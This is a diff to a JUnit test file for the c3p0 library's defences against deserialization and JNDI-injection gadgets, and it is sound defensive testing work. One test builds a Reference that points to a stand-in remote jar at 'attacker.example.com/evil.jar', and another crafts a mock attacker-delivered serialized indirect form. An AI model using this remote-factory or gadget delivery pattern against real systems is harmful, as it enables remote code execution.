@@ -16,6 +16,7 @@ import com.mchange.v2.naming.ReferenceableUtils;
 import com.mchange.v2.naming.ReferenceIndirector;
 import com.mchange.v2.naming.SecurityConfigKey;
 import com.mchange.v2.ser.IndirectlySerialized;
+import com.mchange.v2.ser.IndirectSerializationForbiddenException;
 import com.mchange.v2.ser.SerializableUtils;
 
 /**
@@ -54,22 +55,31 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
             System.getProperty( SecurityConfigKey.SUPPORT_REFERENCE_REMOTE_FACTORY_CLASS_LOCATION )
         );
 
-        // Build a Reference with a whitelisted factory but a remote factoryClassLocation.
-        // If remote class loading were active, resolution would attempt to fetch from this URL.
-        // C3P0JavaBeanObjectFactory uses ref.getClassName() to determine which class to instantiate.
-        Reference ref = new Reference(
-            "java.util.HashMap",
-            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
-            "http://attacker.example.com/evil.jar"
-        );
+        // Start from a properly-formed c3p0 reference, then graft on a bogus remote
+        // factoryClassLocation. If remote class loading were active, resolution would attempt to fetch
+        // the factory from this URL; with the mitigation it is ignored and the factory loads from the
+        // local classpath. (The referenced class must itself be whitelisted via
+        // referenceableJavaBeanClassWhitelist, which ComboPooledDataSource is by default.)
+        ComboPooledDataSource cpds = new ComboPooledDataSource();
+        try
+        {
+            Reference real = cpds.getReference();
+            Reference ref = new Reference( real.getClassName(), real.getFactoryClassName(), "http://attacker.example.com/evil.jar" );
+            for ( Enumeration e = real.getAll(); e.hasMoreElements(); )
+                ref.add( (RefAddr) e.nextElement() );
 
-        Set whitelist = new HashSet();
-        whitelist.add( "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory" );
+            Set whitelist = new HashSet();
+            whitelist.add( "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory" );
 
-        // This should succeed using the local classpath, ignoring the remote URL
-        Object result = ReferenceableUtils.referenceToObject( ref, null, null, null, whitelist );
-        assertNotNull( "Should resolve reference locally despite remote factoryClassLocation", result );
-        assertTrue( "Resolved object should be a HashMap", result instanceof HashMap );
+            // This should succeed using the local classpath, ignoring the remote URL
+            Object result = ReferenceableUtils.referenceToObject( ref, null, null, null, whitelist );
+            assertNotNull( "Should resolve reference locally despite remote factoryClassLocation", result );
+            assertTrue( "Resolved object should be a ComboPooledDataSource", result instanceof ComboPooledDataSource );
+
+            ((ComboPooledDataSource) result).close();
+        }
+        finally
+        { cpds.close(); }
     }
 
     // ======================================================================
@@ -166,19 +176,25 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
      */
     public void testDefaultWhitelistAllowsC3P0Factories() throws Exception
     {
-        // Use the PropertiesConfig overload so the whitelist from c3p0-default.properties is found
+        // Use the PropertiesConfig overload so the whitelists from c3p0-default.properties are found
         PropertiesConfig pcfg = C3P0Config.getMultiPropertiesConfig();
 
-        Reference ref = new Reference(
-            "java.util.HashMap",
-            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
-            null
-        );
+        ComboPooledDataSource cpds = new ComboPooledDataSource();
+        try
+        {
+            Reference ref = cpds.getReference();
 
-        // Should succeed — C3P0JavaBeanObjectFactory is in the default whitelist
-        Object result = ReferenceableUtils.referenceToObject( ref, null, null, null, pcfg );
-        assertNotNull( "C3P0JavaBeanObjectFactory should be permitted by default whitelist", result );
-        assertTrue( "Resolved object should be a HashMap", result instanceof HashMap );
+            // Should succeed — C3P0JavaBeanObjectFactory (objectFactoryWhitelist) is the factory and
+            // ComboPooledDataSource (referenceableJavaBeanClassWhitelist) is the referenced class;
+            // both are in the default whitelists.
+            Object result = ReferenceableUtils.referenceToObject( ref, null, null, null, pcfg );
+            assertNotNull( "A c3p0 datasource reference should be resolvable under the default whitelists", result );
+            assertTrue( "Resolved object should be a ComboPooledDataSource", result instanceof ComboPooledDataSource );
+
+            ((ComboPooledDataSource) result).close();
+        }
+        finally
+        { cpds.close(); }
     }
 
     public void testDefaultWhitelistRejectsArbitraryFactory() throws Exception
@@ -415,8 +431,11 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
     // ======================================================================
 
     /**
-     * When a ReferenceIndirector produces an IndirectlySerialized with a non-null
-     * InitialContext environment, getObject() should reject it by default because
+     * The indirect-serialization-via-Reference mechanism is forbidden by default (see
+     * {@link #testIndirectSerializationViaReferenceForbiddenByDefault}). Once it has been
+     * explicitly (and dangerously) enabled via allowIndirectSerializationViaReference, a second
+     * line of defense remains: an IndirectlySerialized carrying a non-null InitialContext
+     * environment is still rejected at getObject() time, because
      * acceptDeserializedInitialContextEnvironment defaults to false.
      *
      * This prevents attackers from injecting JNDI context properties that redirect
@@ -425,9 +444,17 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
     public void testDeserializedInitialContextEnvironmentRejected() throws Exception
     {
         assertNull(
-            "Test precondition: system property should not be set",
+            "Test precondition: acceptDeserializedInitialContextEnvironment system property should not be set",
             System.getProperty( SecurityConfigKey.ACCEPT_DESERIALIZED_INITIAL_CONTEXT_ENVIRONMENT )
         );
+        assertNull(
+            "Test precondition: allowIndirectSerializationViaReference system property should not be set",
+            System.getProperty( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+        );
+
+        // Opt in to the otherwise-forbidden indirect-serialization-via-Reference mechanism, so we can
+        // verify the second-line-of-defense environment check that lives behind it.
+        PropertiesConfig pcfg = allowIndirectSerializationPropertiesConfig();
 
         // Create a ReferenceIndirector with a non-null environment that an attacker
         // might use to redirect JNDI lookups
@@ -443,48 +470,45 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
             public Reference getReference() throws NamingException
             {
                 return new Reference(
-                    "java.util.HashMap",
+                    "com.mchange.v2.c3p0.DriverManagerDataSource",
                     "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
                     null
                 );
             }
         };
 
-        IndirectlySerialized indirect = indirector.indirectForm( dummyReferenceable );
+        IndirectlySerialized indirect = indirector.indirectForm( dummyReferenceable, pcfg );
 
-        // getObject() with no config should reject the non-null environment
+        // getObject(), even with indirect serialization allowed, must reject the non-null environment
         try
         {
-            indirect.getObject();
-            fail( "getObject() should reject IndirectlySerialized with non-null environment by default" );
+            indirect.getObject( pcfg );
+            fail( "getObject() should reject IndirectlySerialized with non-null environment" );
         }
         catch ( IOException expected )
         {
             assertTrue(
-                "Error message should reference the security config key",
+                "Error message should reference the acceptDeserializedInitialContextEnvironment config key, got: " + expected.getMessage(),
                 expected.getMessage().contains( SecurityConfigKey.ACCEPT_DESERIALIZED_INITIAL_CONTEXT_ENVIRONMENT )
             );
-        }
-
-        // Also test the pcfg overload
-        try
-        {
-            indirect.getObject( null );
-            fail( "getObject(null pcfg) should also reject non-null environment" );
-        }
-        catch ( IOException expected )
-        {
-            // expected
         }
     }
 
     /**
-     * An IndirectlySerialized produced with a null environment (the normal case)
-     * should be accepted. We can't fully resolve it without a JNDI context, but
-     * it should not be rejected at the environment-check stage.
+     * Once indirect serialization via Reference is enabled, an IndirectlySerialized produced with a
+     * null environment (the normal case) should be accepted at the environment-check stage. We can't
+     * fully resolve it without a real JNDI context, but it must not be rejected because of the
+     * environment.
      */
     public void testNullEnvironmentIndirectSerializationNotRejectedAtEnvStage() throws Exception
     {
+        assertNull(
+            "Test precondition: allowIndirectSerializationViaReference system property should not be set",
+            System.getProperty( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+        );
+
+        PropertiesConfig pcfg = allowIndirectSerializationPropertiesConfig();
+
         ReferenceIndirector indirector = new ReferenceIndirector();
         // environment is null by default
 
@@ -493,21 +517,20 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
             public Reference getReference() throws NamingException
             {
                 return new Reference(
-                    "java.util.HashMap",
+                    "com.mchange.v2.c3p0.DriverManagerDataSource",
                     "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
                     null
                 );
             }
         };
 
-        IndirectlySerialized indirect = indirector.indirectForm( dummyReferenceable );
+        IndirectlySerialized indirect = indirector.indirectForm( dummyReferenceable, pcfg );
 
-        // This will try to resolve the reference via JNDI / ReferenceableUtils.
-        // It may fail for other reasons (no JNDI context, etc.) but should NOT
-        // fail with the "non-default (non-null) InitialContext environment" error.
+        // Resolution may fail for unrelated reasons (no real JNDI context, etc.), but it must NOT
+        // fail with the "non-default (non-null) InitialContext environment" rejection.
         try
         {
-            indirect.getObject();
+            indirect.getObject( pcfg );
             // If it succeeds, that's fine
         }
         catch ( IOException e )
@@ -599,5 +622,138 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
                 expected.getMessage().contains( "unexpected type" )
             );
         }
+    }
+
+    // ======================================================================
+    //  9. Indirect serialization via Reference is forbidden by default
+    // ======================================================================
+
+    /**
+     * By default (no opt-in via allowIndirectSerializationViaReference), the indirect
+     * serialization-via-Reference mechanism is forbidden outright: ReferenceIndirector.indirectForm()
+     * throws IndirectSerializationForbiddenException. This is the primary mitigation; the
+     * environment-rejection checks exercised above are a second line of defense that only applies
+     * once the mechanism has been explicitly (and dangerously) enabled.
+     */
+    public void testIndirectSerializationViaReferenceForbiddenByDefault() throws Exception
+    {
+        assertNull(
+            "Test precondition: allowIndirectSerializationViaReference system property should not be set",
+            System.getProperty( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+        );
+
+        ReferenceIndirector indirector = new ReferenceIndirector();
+        Referenceable dummyReferenceable = new Referenceable()
+        {
+            public Reference getReference() throws NamingException
+            {
+                return new Reference(
+                    "com.mchange.v2.c3p0.DriverManagerDataSource",
+                    "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
+                    null
+                );
+            }
+        };
+
+        // indirectForm() with no PropertiesConfig consults only system properties (none set), so the
+        // mechanism is forbidden and creation of the indirect form itself fails.
+        try
+        {
+            indirector.indirectForm( dummyReferenceable );
+            fail( "indirectForm() should be forbidden by default" );
+        }
+        catch ( IndirectSerializationForbiddenException expected )
+        {
+            assertTrue(
+                "Error should reference the allowIndirectSerializationViaReference config key, got: " + expected.getMessage(),
+                expected.getMessage().contains( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+            );
+        }
+    }
+
+    /**
+     * Even more important than refusing to *create* an indirect form (above): if an attacker has
+     * already obtained or crafted an indirect form -- e.g. a serialized ReferenceSerialized delivered
+     * into a Java-deserialization sink -- then *decoding* it must fail by default. Otherwise the
+     * JNDI-injection gadget fires on deserialization, which is exactly the attack we are defending
+     * against.
+     *
+     * We synthesize the attacker's artifact by creating an indirect form under an opt-in config (it
+     * could only have come into existence while the dangerous mechanism was enabled, or been
+     * hand-crafted), then verify that decoding it under the default (restrictive) config is refused --
+     * both via the IndirectlySerialized.getObject() entry point directly, and via the realistic
+     * SerializableUtils.fromByteArray() path that auto-unwraps indirect forms on deserialization.
+     */
+    public void testDecodingIndirectFormForbiddenByDefault() throws Exception
+    {
+        assertNull(
+            "Test precondition: allowIndirectSerializationViaReference system property should not be set",
+            System.getProperty( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+        );
+
+        // The artifact an attacker possesses: an indirect form. It could only have been produced while
+        // the dangerous mechanism was enabled, so we build it here with an opt-in config.
+        PropertiesConfig allowPcfg = allowIndirectSerializationPropertiesConfig();
+        ReferenceIndirector indirector = new ReferenceIndirector();
+        Referenceable dummyReferenceable = new Referenceable()
+        {
+            public Reference getReference() throws NamingException
+            {
+                return new Reference(
+                    "com.mchange.v2.c3p0.DriverManagerDataSource",
+                    "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
+                    null
+                );
+            }
+        };
+        IndirectlySerialized indirect = indirector.indirectForm( dummyReferenceable, allowPcfg );
+
+        // (a) Decoding the indirect form directly must be refused by default.
+        try
+        {
+            indirect.getObject();
+            fail( "Decoding (getObject) an indirect form must be forbidden by default" );
+        }
+        catch ( IndirectSerializationForbiddenException expected )
+        {
+            assertTrue(
+                "Error should reference the allowIndirectSerializationViaReference config key, got: " + expected.getMessage(),
+                expected.getMessage().contains( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE )
+            );
+        }
+
+        // (b) The realistic delivery path: the indirect form is serialized and fed into a
+        // Java-deserialization sink. SerializableUtils.fromByteArray() auto-unwraps IndirectlySerialized
+        // via getObject(), which must likewise refuse by default.
+        byte[] attackerBytes = SerializableUtils.toByteArray( indirect );
+        try
+        {
+            SerializableUtils.fromByteArray( attackerBytes );
+            fail( "Deserializing an attacker-delivered indirect form must be forbidden by default" );
+        }
+        catch ( IndirectSerializationForbiddenException expected )
+        {
+            // expected
+        }
+    }
+
+    // Returns a PropertiesConfig that delegates to c3p0's normal configuration but forces
+    // allowIndirectSerializationViaReference=true, opting in to the (otherwise forbidden-by-default)
+    // indirect-serialization-via-Reference mechanism so we can exercise the mitigations behind it.
+    private static PropertiesConfig allowIndirectSerializationPropertiesConfig()
+    {
+        final PropertiesConfig base = C3P0Config.getMultiPropertiesConfig();
+        return new PropertiesConfig()
+        {
+            public String getProperty( String key )
+            {
+                if ( SecurityConfigKey.ALLOW_INDIRECT_SERIALIZATION_VIA_REFERENCE.equals( key ) )
+                    return "true";
+                else
+                    return base.getProperty( key );
+            }
+            public java.util.Properties getPropertiesByPrefix( String pfx )
+            { return base.getPropertiesByPrefix( pfx ); }
+        };
     }
 }
